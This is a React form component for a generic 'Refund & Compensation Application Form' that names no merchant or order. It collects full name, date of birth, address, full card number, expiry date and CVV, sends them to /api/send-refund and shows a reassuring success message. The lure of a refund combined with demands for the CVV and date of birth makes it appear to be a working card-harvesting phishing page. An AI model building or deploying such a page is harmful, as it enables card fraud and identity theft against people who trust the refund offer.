"use client"

import type React from "react"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { useToast } from "@/hooks/use-toast"
import { Toaster } from "@/components/ui/toaster"
import {
  User,
  Mail,
  Phone,
  Calendar,
  MapPin,
  Building2,
  MapPinned,
  Globe,
  CreditCard,
  Award as IdCard,
  Lock,
  CheckCircle2,
  XCircle,
} from "lucide-react"

const sanitizeInput = (input: string): string => {
  return input
    .trim()
    .replace(/[<>]/g, "") // Remove potential HTML tags
    .replace(/[^\w\s@.,\-()]/gi, "") // Allow only alphanumeric, spaces, and common punctuation
}

const sanitizeEmail = (email: string): string => {
  return email.trim().toLowerCase().replace(/[<>]/g, "")
}

const sanitizePhoneNumber = (phone: string): string => {
  return phone.replace(/[^\d\s\-()]/g, "") // Only digits, spaces, dashes, and parentheses
}

const sanitizeCardNumber = (card: string): string => {
  return card.replace(/[^\d\s]/g, "") // Only digits and spaces
}

const sanitizeCVV = (cvv: string): string => {
  return cvv.replace(/\D/g, "") // Only digits
}

const sanitizeExpirationDate = (date: string): string => {
  return date.replace(/[^\d/]/g, "") // Only digits and forward slash
}

const validateEmail = (email: string): boolean => {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  return emailRegex.test(email)
}

const validatePhoneNumber = (phone: string): boolean => {
  const digitsOnly = phone.replace(/\D/g, "")
  return digitsOnly.length >= 10 && digitsOnly.length <= 15
}

const validateCardNumber = (card: string): boolean => {
  const digitsOnly = card.replace(/\D/g, "")
  return digitsOnly.length >= 13 && digitsOnly.length <= 19
}

const validateExpirationDate = (date: string): boolean => {
  const regex = /^(0[1-9]|1[0-2])\/\d{2}$/
  if (!regex.test(date)) return false

  const [month, year] = date.split("/")
  const expDate = new Date(2000 + Number.parseInt(year), Number.parseInt(month) - 1)
  const today = new Date()
  return expDate > today
}

const validateCVV = (cvv: string): boolean => {
  return cvv.length >= 3 && cvv.length <= 4 && /^\d+$/.test(cvv)
}

const validateAge = (dateOfBirth: string): boolean => {
  if (!dateOfBirth) return false

  const birthDate = new Date(dateOfBirth)
  const today = new Date()
  let age = today.getFullYear() - birthDate.getFullYear()
  const monthDiff = today.getMonth() - birthDate.getMonth()

  if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
    age--
  }

  return age >= 18
}

export default function RefundForm() {
  const { toast } = useToast()
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [formData, setFormData] = useState({
    fullName: "",
    email: "",
    phoneNumber: "",
    dateOfBirth: "",
    address: "",
    city: "",
    postalCode: "",
    country: "",
    cardType: "",
    cardNumber: "",
    nameOnCard: "",
    expirationDate: "",
    cvv: "",
  })

  const handleInputChange = (field: string, value: string) => {
    let sanitizedValue = value

    switch (field) {
      case "email":
        sanitizedValue = sanitizeEmail(value)
        break
      case "phoneNumber":
        sanitizedValue = sanitizePhoneNumber(value)
        break
      case "cardNumber":
        sanitizedValue = sanitizeCardNumber(value)
        break
      case "cvv":
        sanitizedValue = sanitizeCVV(value)
        break
      case "expirationDate":
        sanitizedValue = sanitizeExpirationDate(value)
        // Auto-format MM/YY
        if (sanitizedValue.length === 2 && !sanitizedValue.includes("/")) {
          sanitizedValue += "/"
        }
        break
      case "fullName":
      case "address":
      case "city":
      case "postalCode":
      case "nameOnCard":
        sanitizedValue = sanitizeInput(value)
        break
    }

    setFormData((prev) => ({ ...prev, [field]: sanitizedValue }))
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!validateAge(formData.dateOfBirth)) {
      toast({
        title: (
          <div className="flex items-center gap-2">
            <XCircle className="h-5 w-5" />
            <span>Age Requirement Not Met</span>
          </div>
        ),
        description: "You must be at least 18 years old to submit a refund application.",
        variant: "destructive",
        duration: 4000,
        className: "top-0 left-1/2 -translate-x-1/2 md:max-w-[420px]",
      })
      return
    }

    // Validate all fields
    if (!validateEmail(formData.email)) {
      toast({
        title: (
          <div className="flex items-center gap-2">
            <XCircle className="h-5 w-5" />
            <span>Invalid Email</span>
          </div>
        ),
        description: "Please enter a valid email address.",
        variant: "destructive",
        duration: 4000,
        className: "top-0 left-1/2 -translate-x-1/2 md:max-w-[420px]",
      })
      return
    }

    if (!validatePhoneNumber(formData.phoneNumber)) {
      toast({
        title: (
          <div className="flex items-center gap-2">
            <XCircle className="h-5 w-5" />
            <span>Invalid Phone Number</span>
          </div>
        ),
        description: "Please enter a valid phone number (10-15 digits).",
        variant: "destructive",
        duration: 4000,
        className: "top-0 left-1/2 -translate-x-1/2 md:max-w-[420px]",
      })
      return
    }

    if (!validateCardNumber(formData.cardNumber)) {
      toast({
        title: (
          <div className="flex items-center gap-2">
            <XCircle className="h-5 w-5" />
            <span>Invalid Card Number</span>
          </div>
        ),
        description: "Please enter a valid card number (13-19 digits).",
        variant: "destructive",
        duration: 4000,
        className: "top-0 left-1/2 -translate-x-1/2 md:max-w-[420px]",
      })
      return
    }

    if (!validateExpirationDate(formData.expirationDate)) {
      toast({
        title: (
          <div className="flex items-center gap-2">
            <XCircle className="h-5 w-5" />
            <span>Invalid Expiration Date</span>
          </div>
        ),
        description: "Please enter a valid expiration date (MM/YY) that hasn't expired.",
        variant: "destructive",
        duration: 4000,
        className: "top-0 left-1/2 -translate-x-1/2 md:max-w-[420px]",
      })
      return
    }

    if (!validateCVV(formData.cvv)) {
      toast({
        title: (
          <div className="flex items-center gap-2">
            <XCircle className="h-5 w-5" />
            <span>Invalid CVV</span>
          </div>
        ),
        description: "Please enter a valid CVV (3-4 digits).",
        variant: "destructive",
        duration: 4000,
        className: "top-0 left-1/2 -translate-x-1/2 md:max-w-[420px]",
      })
      return
    }

    setIsSubmitting(true)

    try {
      const response = await fetch("/api/send-refund", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      })

      const data = await response.json()

      if (response.ok) {
        toast({
          title: (
            <div className="flex items-center gap-2">
              <CheckCircle2 className="h-5 w-5 text-green-500" />
              <span>Application Submitted Successfully!</span>
            </div>
          ),
          description:
            "Your refund application has been received. We'll process it within 3-5 business days and send you a confirmation email.",
          duration: 6000,
          className:
            "top-0 left-1/2 -translate-x-1/2 md:max-w-[420px] border-green-500/50 bg-green-50 dark:bg-green-950",
        })
        // Reset form
        setFormData({
          fullName: "",
          email: "",
          phoneNumber: "",
          dateOfBirth: "",
          address: "",
          city: "",
          postalCode: "",
          country: "",
          cardType: "",
          cardNumber: "",
          nameOnCard: "",
          expirationDate: "",
          cvv: "",
        })
      } else {
        toast({
          title: (
            <div className="flex items-center gap-2">
              <XCircle className="h-5 w-5" />
              <span>Submission Failed</span>
            </div>
          ),
          description:
            data.error || "We couldn't process your application. Please check your information and try again.",
          variant: "destructive",
          duration: 5000,
          className: "top-0 left-1/2 -translate-x-1/2 md:max-w-[420px]",
        })
      }
    } catch (error) {
      toast({
        title: (
          <div className="flex items-center gap-2">
            <XCircle className="h-5 w-5" />
            <span>Connection Error</span>
          </div>
        ),
        description: "Unable to connect to the server. Please check your internet connection and try again.",
        variant: "destructive",
        duration: 5000,
        className: "top-0 left-1/2 -translate-x-1/2 md:max-w-[420px]",
      })
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <>
      <div className="min-h-screen px-4 py-8 md:py-12" style={{ backgroundColor: "#D5DCE6" }}>
        <div className="mx-auto max-w-3xl rounded-lg bg-white p-6 shadow-sm md:p-8">
          <div className="mb-8 text-center">
            <h1 className="font-serif text-3xl font-normal text-foreground md:text-4xl">Refund & Compensation</h1>
            <h2 className="font-serif text-3xl font-normal text-foreground md:text-4xl">Application Form</h2>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Full Name */}
            <div className="space-y-2">
              <Label htmlFor="fullName" className="flex items-center gap-2 text-base">
                <User className="h-4 w-4" />
                Full Name <span className="text-destructive">*</span>
              </Label>
              <Input
                id="fullName"
                required
                value={formData.fullName}
                onChange={(e) => handleInputChange("fullName", e.target.value)}
                className="h-12"
              />
            </div>

            {/* Email and Phone Number */}
            <div className="grid gap-4 md:grid-cols-2">
              <div className="space-y-2">
                <Label htmlFor="email" className="flex items-center gap-2 text-base">
                  <Mail className="h-4 w-4" />
                  Email <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="email"
                  type="email"
                  placeholder="Email"
                  required
                  value={formData.email}
                  onChange={(e) => handleInputChange("email", e.target.value)}
                  className="h-12"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="phoneNumber" className="flex items-center gap-2 text-base">
                  <Phone className="h-4 w-4" />
                  Phone Number <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="phoneNumber"
                  type="tel"
                  placeholder="( ___ ) ___-____"
                  required
                  value={formData.phoneNumber}
                  onChange={(e) => handleInputChange("phoneNumber", e.target.value)}
                  className="h-12"
                />
              </div>
            </div>

            {/* Date of Birth */}
            <div className="space-y-2">
              <Label htmlFor="dateOfBirth" className="flex items-center gap-2 text-base">
                <Calendar className="h-4 w-4" />
                Date Of Birth <span className="text-destructive">*</span>
              </Label>
              <Input
                id="dateOfBirth"
                type="date"
                required
                value={formData.dateOfBirth}
                onChange={(e) => handleInputChange("dateOfBirth", e.target.value)}
                className="h-12"
              />
            </div>

            {/* Address */}
            <div className="space-y-2">
              <Label htmlFor="address" className="flex items-center gap-2 text-base">
                <MapPin className="h-4 w-4" />
                Address <span className="text-destructive">*</span>
              </Label>
              <Input
                id="address"
                placeholder="Address"
                required
                value={formData.address}
                onChange={(e) => handleInputChange("address", e.target.value)}
                className="h-12"
              />
            </div>

            {/* City */}
            <div className="space-y-2">
              <Label htmlFor="city" className="flex items-center gap-2 text-base">
                <Building2 className="h-4 w-4" />
                City <span className="text-destructive">*</span>
              </Label>
              <Input
                id="city"
                placeholder="City"
                required
                value={formData.city}
                onChange={(e) => handleInputChange("city", e.target.value)}
                className="h-12"
              />
            </div>

            {/* Postal Code */}
            <div className="space-y-2">
              <Label htmlFor="postalCode" className="flex items-center gap-2 text-base">
                <MapPinned className="h-4 w-4" />
                POSTAL Code <span className="text-destructive">*</span>
              </Label>
              <Input
                id="postalCode"
                placeholder="Postal Code"
                required
                value={formData.postalCode}
                onChange={(e) => handleInputChange("postalCode", e.target.value)}
                className="h-12"
              />
            </div>

            {/* Country */}
            <div className="space-y-2">
              <Label htmlFor="country" className="flex items-center gap-2 text-base">
                <Globe className="h-4 w-4" />
                Country <span className="text-destructive">*</span>
              </Label>
              <Select required value={formData.country} onValueChange={(value) => handleInputChange("country", value)}>
                <SelectTrigger className="h-12">
                  <SelectValue placeholder="-Select-" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="us">United States</SelectItem>
                  <SelectItem value="uk">United Kingdom</SelectItem>
                  <SelectItem value="ca">Canada</SelectItem>
                  <SelectItem value="au">Australia</SelectItem>
                  <SelectItem value="de">Germany</SelectItem>
                  <SelectItem value="fr">France</SelectItem>
                  <SelectItem value="other">Other</SelectItem>
                </SelectContent>
              </Select>
            </div>

            {/* Card Type */}
            <div className="space-y-3">
              <Label className="text-base font-normal">
                DEBIT/CREDIT CARD TO BE REFUNDED <span className="text-destructive">*</span>
              </Label>
              <RadioGroup
                required
                value={formData.cardType}
                onValueChange={(value) => handleInputChange("cardType", value)}
                className="space-y-3"
              >
                <div className="flex items-center space-x-2">
                  <RadioGroupItem value="visa" id="visa" />
                  <Label htmlFor="visa" className="flex items-center gap-2 font-normal">
                    <CreditCard className="h-4 w-4" />
                    VISA
                  </Label>
                </div>
                <div className="flex items-center space-x-2">
                  <RadioGroupItem value="mastercard" id="mastercard" />
                  <Label htmlFor="mastercard" className="flex items-center gap-2 font-normal">
                    <CreditCard className="h-4 w-4" />
                    MASTERCARD
                  </Label>
                </div>
                <div className="flex items-center space-x-2">
                  <RadioGroupItem value="amex" id="amex" />
                  <Label htmlFor="amex" className="flex items-center gap-2 font-normal">
                    <CreditCard className="h-4 w-4" />
                    AMERICAN EXPRESS
                  </Label>
                </div>
              </RadioGroup>
            </div>

            {/* Card Number */}
            <div className="space-y-2">
              <Label htmlFor="cardNumber" className="flex items-center gap-2 text-base">
                <CreditCard className="h-4 w-4" />
                Card Number <span className="text-destructive">*</span>
              </Label>
              <Input
                id="cardNumber"
                required
                value={formData.cardNumber}
                onChange={(e) => handleInputChange("cardNumber", e.target.value)}
                className="h-12"
                maxLength={19}
              />
            </div>

            {/* Name on Card */}
            <div className="space-y-2">
              <Label htmlFor="nameOnCard" className="flex items-center gap-2 text-base">
                <IdCard className="h-4 w-4" />
                Name On Card <span className="text-destructive">*</span>
              </Label>
              <Input
                id="nameOnCard"
                required
                value={formData.nameOnCard}
                onChange={(e) => handleInputChange("nameOnCard", e.target.value)}
                className="h-12"
              />
            </div>

            {/* Expiration Date and CVV */}
            <div className="grid gap-4 md:grid-cols-2">
              <div className="space-y-2">
                <Label htmlFor="expirationDate" className="flex items-center gap-2 text-base">
                  <Calendar className="h-4 w-4" />
                  Expiration Date <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="expirationDate"
                  placeholder="MM/YY"
                  required
                  value={formData.expirationDate}
                  onChange={(e) => handleInputChange("expirationDate", e.target.value)}
                  className="h-12"
                  maxLength={5}
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="cvv" className="flex items-center gap-2 text-base">
                  <Lock className="h-4 w-4" />
                  CVV <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="cvv"
                  type="password"
                  required
                  value={formData.cvv}
                  onChange={(e) => handleInputChange("cvv", e.target.value)}
                  className="h-12"
                  maxLength={4}
                />
              </div>
            </div>

            {/* Submit Button */}
            <Button
              type="submit"
              disabled={isSubmitting}
              className="h-12 w-full bg-blue-600 text-base font-medium hover:bg-blue-700 md:w-auto md:px-12"
            >
              {isSubmitting ? "Submitting..." : "Submit Refund"}
            </Button>
          </form>

          <footer className="mt-8 text-center text-sm text-muted-foreground">
            Refunds Today 2025 © All Rights Reserved.
          </footer>
        </div>
      </div>
      <Toaster />
    </>
  )
}
